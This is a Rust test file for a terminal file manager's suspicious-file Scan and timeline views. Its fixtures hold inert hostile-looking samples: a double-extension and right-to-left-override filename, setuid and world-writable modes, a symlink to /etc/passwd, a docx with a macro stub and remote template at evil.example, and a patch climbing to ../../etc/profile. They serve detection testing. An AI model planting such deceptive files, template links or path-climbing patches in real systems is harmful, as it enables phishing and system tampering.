//! The views of the list (Alt+V): the selector and the Scan.

use super::*;
use crate::scan::Category;
use std::fs::{create_dir_all, write};

fn press(app: &mut App, code: KeyCode) {
    app.handle_key(KeyEvent::new(code, KeyModifiers::NONE));
}

fn alt(app: &mut App, c: char) {
    app.handle_key(KeyEvent::new(KeyCode::Char(c), KeyModifiers::ALT));
}

/// Until the Scan's thread is done.
fn settle(app: &mut App) {
    let start = Instant::now();
    while app.scan.as_ref().is_some_and(ScanView::running) {
        app.tick(Duration::from_millis(20));
        assert!(
            start.elapsed() < Duration::from_secs(20),
            "the Scan never ended"
        );
    }
}

fn count(app: &App, cat: Category) -> usize {
    app.scan.as_ref().unwrap().found(cat).unwrap().count()
}

/// A folder with something for each category, logged and shown as a Branch.
fn hostile() -> (tempfile::TempDir, App) {
    let tmp = crate::testing::tempdir();
    let p = tmp.path();
    create_dir_all(p.join("sub")).unwrap();
    write(p.join("fatura.pdf.exe"), "MZ").unwrap();
    write(p.join("fdp\u{202E}exe.pdf"), "x").unwrap();
    write(p.join("plain.txt"), "x").unwrap();
    write(p.join("sub/report.doc"), "x").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::{PermissionsExt, symlink};
        let mode = |path: &Path, m| {
            std::fs::set_permissions(path, std::fs::Permissions::from_mode(m)).unwrap()
        };
        write(p.join("sub/open.sh"), "x").unwrap();
        mode(&p.join("sub/open.sh"), 0o666);
        write(p.join("sub/suid"), "x").unwrap();
        mode(&p.join("sub/suid"), 0o4755);
        create_dir_all(p.join("shared")).unwrap();
        mode(&p.join("shared"), 0o777);
        symlink("/etc/passwd", p.join("sub/passwd")).unwrap();
        symlink("gone", p.join("broken")).unwrap();
        symlink("plain.txt", p.join("fine")).unwrap();
    }
    let mut app = App::new(p.to_path_buf());
    app.apply(Command::ExpandAll);
    while app.job.is_some() {
        app.tick(Duration::from_millis(50));
    }
    app.apply(Command::Branch);
    (tmp, app)
}

#[test]
fn alt_v_opens_the_selector_and_s_the_scan() {
    let (_tmp, mut app) = hostile();
    alt(&mut app, 'v');
    let menu = app.context_menu.as_ref().expect("the selector");
    assert!(menu.letters);
    press(&mut app, KeyCode::Char('s'));
    assert!(app.context_menu.is_none());
    assert!(app.scan.is_some());
    settle(&mut app);
    assert_eq!(count(&app, Category::HiddenChars), 1);
    assert_eq!(count(&app, Category::Deceiving), 1);
    #[cfg(unix)]
    {
        // open.sh, suid and the folder shared; the links' own modes do not count.
        assert_eq!(count(&app, Category::Permissions), 3);
        assert_eq!(count(&app, Category::Links), 2);
    }
    assert_eq!(app.help_topic(), "views#scan");
    press(&mut app, KeyCode::Esc);
    assert!(app.scan.is_none());
}

#[test]
fn a_category_goes_back_to_the_list_as_a_filter() {
    let (tmp, mut app) = hostile();
    let all = app.files.len();
    app.apply(Command::ViewScan);
    settle(&mut app);
    // The second category: names that deceive.
    press(&mut app, KeyCode::Down);
    press(&mut app, KeyCode::Enter);
    assert_eq!(app.scan.as_ref().unwrap().open, Some(1));
    press(&mut app, KeyCode::Enter);
    assert!(app.scan.is_none());
    assert_eq!(app.files.len(), 1);
    assert_eq!(app.focus, Focus::Files);
    let f = app.selected_file().unwrap();
    assert_eq!(app.file_path(f), tmp.path().join("fatura.pdf.exe"));
    assert!(app.pick.as_ref().unwrap().label.contains("deceiving"));
    // The Scan is kept: Alt+V, S on the same list opens it again.
    app.apply(Command::ViewScan);
    assert_eq!(app.scan.as_ref().unwrap().selected, 1);
    press(&mut app, KeyCode::Esc);
    // W with no text takes the choice away.
    app.set_query("", false).unwrap();
    assert!(app.pick.is_none());
    assert_eq!(app.files.len(), all);
}

#[cfg(unix)]
#[test]
fn a_folder_hit_goes_to_the_tree() {
    let (tmp, mut app) = hostile();
    app.apply(Command::ViewScan);
    settle(&mut app);
    let view = app.scan.as_mut().unwrap();
    view.selected = 2;
    let hits = &view.found[2].1.hits;
    view.hit = hits.iter().position(|h| h.dir).expect("the shared folder");
    view.open = Some(2);
    press(&mut app, KeyCode::Enter);
    assert!(app.scan.is_none());
    assert_eq!(app.focus, Focus::Tree);
    assert_eq!(app.current_path(), tmp.path().join("shared"));
    assert!(app.pick.is_none());
}

#[test]
fn v_on_a_hit_views_it_and_esc_comes_back() {
    let (_tmp, mut app) = hostile();
    app.apply(Command::ViewScan);
    settle(&mut app);
    press(&mut app, KeyCode::Enter);
    press(&mut app, KeyCode::Char('v'));
    assert!(app.viewer.is_some());
    press(&mut app, KeyCode::Esc);
    assert!(app.viewer.is_none());
    assert!(app.scan.as_ref().is_some_and(|s| s.open == Some(0)));
}

#[test]
fn an_empty_category_does_not_open() {
    let tmp = crate::testing::tempdir();
    write(tmp.path().join("a.txt"), "x").unwrap();
    let mut app = App::new(tmp.path().to_path_buf());
    app.apply(Command::ViewScan);
    settle(&mut app);
    press(&mut app, KeyCode::Enter);
    assert!(app.scan.as_ref().unwrap().open.is_none());
    assert!(app.message.as_deref().unwrap().contains("Nothing found"));
}

#[test]
fn the_scan_starts_from_the_list_without_a_previous_choice() {
    let (_tmp, mut app) = hostile();
    app.apply(Command::ViewScan);
    settle(&mut app);
    press(&mut app, KeyCode::Down);
    press(&mut app, KeyCode::Enter);
    press(&mut app, KeyCode::Enter);
    assert_eq!(app.files.len(), 1);
    // R in a new Scan of the picked list still sees the whole list.
    app.apply(Command::ViewScan);
    press(&mut app, KeyCode::Char('r'));
    settle(&mut app);
    assert_eq!(count(&app, Category::HiddenChars), 1);
    assert_eq!(app.files.len(), 1, "the choice stays on the list");
}

/// A docx with macros and a remote template, and a patch that climbs out.
fn documents(dir: &Path) {
    use crate::viewer::office::test_docs::zip;
    let docx = zip(&[
        (
            "word/document.xml",
            &format!(
                "<w:document {}><w:body><w:p><w:r><w:t>hi</w:t></w:r></w:p></w:body></w:document>",
                crate::viewer::office::test_docs::W
            ),
        ),
        (
            "word/_rels/settings.xml.rels",
            r#"<Relationships><Relationship Id="r1" Type="http://x/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>"#,
        ),
        ("word/vbaProject.bin", "x"),
    ]);
    write(dir.join("invoice.docx"), docx).unwrap();
    write(
        dir.join("clean.docx"),
        crate::viewer::office::test_docs::docx("<w:p><w:r><w:t>ok</w:t></w:r></w:p>"),
    )
    .unwrap();
    write(
        dir.join("fix.patch"),
        "--- a/../../etc/profile\n+++ b/../../etc/profile\n@@ -1 +1 @@\n-a\n+b\n",
    )
    .unwrap();
    write(
        dir.join("good.patch"),
        "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -1 +1 @@\n-a\n+b\n",
    )
    .unwrap();
    // An Office name on what is not a package: the reader refuses it.
    write(dir.join("broken.docx"), "not a zip").unwrap();
    // The start of an ELF and nothing after: not a binary for the readers.
    write(dir.join("broken.bin"), b"\x7fELF\x02\x01\x01\0garbage").unwrap();
}

#[test]
fn the_scan_reads_documents_and_patches() {
    let tmp = crate::testing::tempdir();
    documents(tmp.path());
    let mut app = App::new(tmp.path().to_path_buf());
    app.apply(Command::ViewScan);
    settle(&mut app);
    let view = app.scan.as_ref().unwrap();
    let office = view.found(Category::Office).unwrap();
    assert_eq!(office.count(), 1, "{:?}", office.hits);
    assert!(
        office.hits[0].why.contains("macros"),
        "{}",
        office.hits[0].why
    );
    assert!(
        office.hits[0].why.contains("attachedTemplate"),
        "{}",
        office.hits[0].why
    );
    let patches = view.found(Category::Patches).unwrap();
    assert_eq!(patches.count(), 1, "{:?}", patches.hits);
    assert!(
        patches.hits[0].why.contains("touches"),
        "{}",
        patches.hits[0].why
    );
    let not = view.found(Category::NotAnalysed).unwrap();
    assert_eq!(not.count(), 1, "{:?}", not.hits);
    assert!(not.hits[0].path.ends_with("broken.docx"), "{:?}", not.hits);
}

#[test]
fn past_the_limit_a_file_is_not_analysed_and_says_why() {
    let tmp = crate::testing::tempdir();
    documents(tmp.path());
    let mut app = App::new(tmp.path().to_path_buf());
    app.options.scan_max_files = 1;
    app.apply(Command::ViewScan);
    settle(&mut app);
    let view = app.scan.as_ref().unwrap();
    let not = view.found(Category::NotAnalysed).unwrap();
    // Five files for the readers, one read (broken.docx, which fails).
    assert_eq!(not.count(), 5, "{:?}", not.hits);
    let past = not.hits.iter().filter(|h| h.why.contains("scan_max_files"));
    assert_eq!(past.count(), 4, "{:?}", not.hits);
}

#[test]
fn esc_stops_the_scan_and_a_stopped_one_is_not_kept() {
    let tmp = crate::testing::tempdir();
    for i in 0..50 {
        documents(&{
            let d = tmp.path().join(format!("d{i}"));
            create_dir_all(&d).unwrap();
            d
        });
    }
    let mut app = App::new(tmp.path().to_path_buf());
    app.apply(Command::ExpandAll);
    while app.job.is_some() {
        app.tick(Duration::from_millis(50));
    }
    app.apply(Command::Showall);
    app.apply(Command::ViewScan);
    assert!(app.scan.as_ref().unwrap().running());
    press(&mut app, KeyCode::Esc);
    let view = app.scan.as_ref().unwrap();
    assert!(!view.running());
    assert!(view.stopped.is_some());
    // Stopped, it is not kept: Esc leaves, and Alt+V, S starts over.
    press(&mut app, KeyCode::Esc);
    assert!(app.scan.is_none());
    app.apply(Command::ViewScan);
    settle(&mut app);
    let view = app.scan.as_ref().unwrap();
    assert!(view.stopped.is_none());
    assert_eq!(view.found(Category::Office).unwrap().count(), 50);
}

#[test]
fn inside_an_archive_the_members_are_read() {
    let tmp = crate::testing::tempdir();
    let inner = tmp.path().join("inner");
    create_dir_all(&inner).unwrap();
    documents(&inner);
    let zip_path = tmp.path().join("pack.zip");
    {
        use std::io::Write;
        let mut w = zip::ZipWriter::new(std::fs::File::create(&zip_path).unwrap());
        let opts = zip::write::SimpleFileOptions::default();
        for name in ["invoice.docx", "fix.patch", "good.patch"] {
            w.start_file(name, opts).unwrap();
            w.write_all(&std::fs::read(inner.join(name)).unwrap())
                .unwrap();
        }
        w.start_file("fatura.pdf.exe", opts).unwrap();
        w.write_all(b"MZ").unwrap();
        w.finish().unwrap();
    }
    std::fs::remove_dir_all(&inner).unwrap();
    let mut app = App::new(tmp.path().to_path_buf());
    press(&mut app, KeyCode::Enter);
    app.file_state.select(Some(0));
    app.handle_key(KeyEvent::new(KeyCode::F(5), KeyModifiers::ALT));
    for _ in 0..3000 {
        if app.opening.is_none() {
            break;
        }
        std::thread::sleep(Duration::from_millis(10));
        app.poll_opening();
    }
    assert!(app.archive.is_some(), "{:?}", app.message);
    app.apply(Command::ViewScan);
    settle(&mut app);
    let view = app.scan.as_ref().unwrap();
    assert_eq!(view.found(Category::Office).unwrap().count(), 1);
    assert_eq!(view.found(Category::Patches).unwrap().count(), 1);
    assert_eq!(view.found(Category::Deceiving).unwrap().count(), 1);
    assert!(view.found(Category::Links).unwrap().note.is_some());
}

/// The whole screen as text, drawn at `w` × `h`.
fn screen(app: &mut App, w: u16, h: u16) -> String {
    use ratatui::{Terminal, backend::TestBackend};
    let mut term = Terminal::new(TestBackend::new(w, h)).unwrap();
    term.draw(|f| crate::ui::draw(f, app)).unwrap();
    let buf = term.backend().buffer().clone();
    (0..h)
        .map(|y| (0..w).map(|x| buf[(x, y)].symbol()).collect::<String>())
        .collect::<Vec<_>>()
        .join("\n")
}

/// Files changed on 2026-11-01, two on 11-18 and one on 11-19, at noon.
fn dated() -> (tempfile::TempDir, App) {
    use chrono::TimeZone;
    let tmp = crate::testing::tempdir();
    for (name, day) in [("a.txt", 1), ("b.txt", 18), ("c.rs", 18), ("d.txt", 19)] {
        let path = tmp.path().join(name);
        write(&path, "x").unwrap();
        let t: std::time::SystemTime = chrono::Local
            .with_ymd_and_hms(2026, 11, day, 12, 0, 0)
            .single()
            .unwrap()
            .into();
        std::fs::File::options()
            .write(true)
            .open(&path)
            .unwrap()
            .set_modified(t)
            .unwrap();
    }
    let app = App::new(tmp.path().to_path_buf());
    (tmp, app)
}

#[test]
fn the_timeline_takes_a_bar_back_to_the_list() {
    let (_tmp, mut app) = dated();
    alt(&mut app, 'v');
    press(&mut app, KeyCode::Char('t'));
    let view = app.timeline.as_ref().expect("the timeline");
    assert_eq!(view.line.scale, crate::timeline::Scale::Days);
    assert_eq!(view.line.bars.len(), 19);
    assert_eq!(view.chosen_label(), "2026-11-19");
    assert_eq!(app.help_topic(), "views#timeline");
    let text = screen(&mut app, 100, 30);
    assert!(text.contains("2026-11-19: 1 file"), "{text}");
    // One bar left: the 18th, two files.
    press(&mut app, KeyCode::Left);
    press(&mut app, KeyCode::Enter);
    assert!(app.timeline.is_none());
    assert_eq!(app.files.len(), 2);
    assert!(
        app.query
            .as_ref()
            .unwrap()
            .text()
            .contains("2026-11-18 00:00:00")
    );
}

#[test]
fn a_range_goes_with_and_to_the_condition_there_was() {
    let (_tmp, mut app) = dated();
    app.set_query("ext = 'txt'", false).unwrap();
    assert_eq!(app.files.len(), 3);
    app.apply(Command::ViewTimeline);
    // The 19th and the 18th: of those, the .txt ones.
    app.handle_key(KeyEvent::new(KeyCode::Left, KeyModifiers::SHIFT));
    assert_eq!(app.timeline.as_ref().unwrap().chosen_sum().0, 2);
    press(&mut app, KeyCode::Enter);
    assert_eq!(app.files.len(), 2);
    let q = app.query.as_ref().unwrap().text().to_string();
    assert!(q.starts_with("(ext = 'txt') AND (modified >="), "{q}");
}

#[test]
fn the_scale_changes_and_bytes_are_counted() {
    let (_tmp, mut app) = dated();
    app.apply(Command::ViewTimeline);
    press(&mut app, KeyCode::Char('-'));
    let view = app.timeline.as_ref().unwrap();
    assert_eq!(view.line.scale, crate::timeline::Scale::Weeks);
    assert_eq!(view.chosen_label(), "week of 2026-11-16");
    press(&mut app, KeyCode::Char('+'));
    press(&mut app, KeyCode::Char('+'));
    let view = app.timeline.as_ref().unwrap();
    assert_eq!(view.line.scale, crate::timeline::Scale::Hours);
    assert_eq!(view.chosen_label(), "2026-11-16 00h");
    press(&mut app, KeyCode::Char('b'));
    assert!(app.timeline.as_ref().unwrap().bytes);
    // Small and large screens draw.
    for (w, h) in [(40, 12), (200, 50)] {
        screen(&mut app, w, h);
    }
    press(&mut app, KeyCode::Esc);
    assert!(app.timeline.is_none());
    assert_eq!(app.files.len(), 4);
}

#[test]
fn the_scan_draws() {
    let (_tmp, mut app) = hostile();
    app.apply(Command::ViewScan);
    settle(&mut app);
    let text = screen(&mut app, 100, 30);
    assert!(text.contains("Names that deceive"), "{text}");
    assert!(text.contains("Not an antivirus"), "{text}");
    press(&mut app, KeyCode::Down);
    press(&mut app, KeyCode::Enter);
    let text = screen(&mut app, 100, 30);
    assert!(text.contains("fatura.pdf.exe"), "{text}");
    assert!(text.contains("runs as .exe"), "{text}");
    screen(&mut app, 30, 10);
}

#[test]
fn the_table_shows_the_list_and_w_takes_its_filter_back() {
    let (_tmp, mut app) = dated();
    alt(&mut app, 'v');
    press(&mut app, KeyCode::Char('l'));
    let v = app.viewer.as_mut().expect("the table of the list");
    assert_eq!(v.mode, crate::viewer::ViewMode::Table);
    let t = v.table.as_ref().unwrap();
    assert_eq!(&t.headers[..4], ["name", "ext", "dir", "size"]);
    assert_eq!(t.visible_row_count(), 4);
    // W with no filter says how to make one.
    press(&mut app, KeyCode::Char('w'));
    let v = app.viewer.as_mut().expect("still open");
    assert!(v.note.as_deref().unwrap().contains("filters the table"));
    v.sql_prompt("ext = 'txt' AND modified >= '2026-11-18'");
    assert_eq!(v.table.as_ref().unwrap().visible_row_count(), 2);
    press(&mut app, KeyCode::Char('w'));
    assert!(app.viewer.is_none());
    assert_eq!(app.files.len(), 2);
    assert_eq!(
        app.query.as_ref().unwrap().text(),
        "ext = 'txt' AND modified >= '2026-11-18'"
    );
}
